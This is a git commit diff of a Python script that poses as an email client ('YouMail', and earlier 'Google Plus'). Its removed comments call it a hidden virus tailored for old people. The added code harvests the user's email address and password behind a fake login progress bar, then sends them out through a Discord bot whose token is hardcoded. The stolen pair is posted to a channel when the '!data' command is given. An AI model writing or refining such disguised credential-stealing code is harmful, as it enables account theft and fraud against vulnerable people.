9c2e7162cd2049b01b8be930c646a68253107ea2
MrCringeGuy <93745239+MrCringeGuy@users.noreply.github.com>
2021-12-20 15:01:02 +0000

    BIG FIX
    I realised how stupid I was in using email. It's now done through a Discord bot

--- Google+.py
+++ Google+.py
@@ -1,106 +1,99 @@
-#Hidden virus inside a program tailored for old people to download. (Google+)
-
 import time
+import discord
 import os
+import tqdm
 
-clear = lambda: os.system("cls")
+from tqdm import *
+
+clear = lambda: os.system('cls')
 email = None
 password = None
-message = None
+msg = None
+client = discord.Client()
+body = None
+title = None
+TOKEN = 'OTIyNDI0MjcyMTk3MTQ4NzMy.YcBQjA.pV3vUmbamJSCH2nXrBlses7i6o8'
 
 def frontend():
-    #Works with the other functions, to create the program.
+    clear()
+    print('Welcome to YouMail, the fastest email service for every provider.')
+    print('With UMail, all you have to do is log in and you can send an email faster than ever before.')
+    input('Press enter to continue...')
+    clear()
 
-    global mode
-
-    print('Welcome to Google Plus.')
-    time.sleep(1)
     login()
+
+def login():
+    global email
+    global password
+
+    print('We are now loggin you in.')
+    email = input('Please enter your email: ')
+    password = input('Please enter your password: ')
     
     clear()
 
-    print('DISCLAMER: This trial will only last for two weeks.')
-    print('')
-    print('')
-    print('')
-    print('(1)Google Chrome +')
-    print('(2)Google Docs +')
-    print('(3)Google Mail +')
+    for _ in tqdm(range(100),
+        desc = 'Logging in',
+        ascii = False):
+        time.sleep(0.6347)
 
-    mode = input('Enter the number to the left of the mode you would like to use: ')
-
-def backend():
-    #To email the details to me.
-    pass
-
-def login():
-    key = input('Enter the license key included in the email you were sent: ')
-
-    if key != 'G+2021KeyA073bbw82':
-        print('Access denied.')
-        exit()
-    else:
-        print('Key confirmed.')
-        print('Proceeding...')
-        time.sleep(0.5)
-
-#These three programs will each be infected, with a hidden way of activating the backend.
-
-def google_chrome():
-    #The worst thing I may do is a 'suspicious access' warning, to grab account details and email them to me.
-    #This will require them to log into a Google + service, so it may not be as reliable as Google Mail +.
-
-    global mode
-
-    pass
-
-def google_docs():
-    #I am currently not planning to do anything with this, maybe just a storage overload.
-
-    global mode
-
-    pass
-
-def google_mail():
-    #The 'virus' in this program will send the email and password of this person's address to my email as soon as it is obtained.
-    global email
-
-    email = input('Enter your email address: ')
-    password = input('Enter your password')
-
-    clear()
-
-    detail_grab()
     send_mail()
-    print('Email sent!')
-    input('Press enter to close this program')
-    #Even if you were to somehow check, when the email is sent, nothing bad has actually happened until you continue.
-    backend()
 
 def send_mail():
-    #sends the real email.
-    reciever = input('Enter the email address you want to send to: ')
-    body = input('Type the whole email here: ')
+    global body
+    global title
+    global reciever
 
-def detail_grab():
-    #Formats the details to send as an email.
+    clear()
+    time.sleep(0.5)
+    reciever = input('Enter the recieving email address: ')
+    body = input('Enter the body of your email: ')
+    title = input('Enter the title of your email: ')
+
+    clear()
+    check_mail()
+
+def check_mail():
+    global email
+    global body
+    global reciever
+    global title
+
+    print('From:', email)
+    print('To:', reciever)
+    print('')
+    print(title)
+    print(body)
+    print('')
+    print('')
+    print('')
+    print('Sending...')
+    client.run(TOKEN)
+
+@client.event
+async def on_message(message):
+    global msg
+    global live
     global email
     global password
-    global message
 
-    message = (str('Email:Passowrd.     ', email, ':', password))
+    msg = (email, password)
 
+    username = str(message.author).split('#')[0]
+    user_message = str(message.content)
+    channel = str(message.channel.name)
+    print(f'{username}: {user_message} ({channel})')
+
+    if live == True:
+        if user_message == '!data':
+            await message.channel.send(msg)
+
+@client.event
+async def on_ready():
+    global msg
+    global live
+
+    live = True
 
 frontend()
-
-if mode == '1':
-    clear()
-    google_chrome()
-
-if mode == '2':
-    clear()
-    google_docs()
-
-if mode == '3':
-    clear()
-    google_mail()
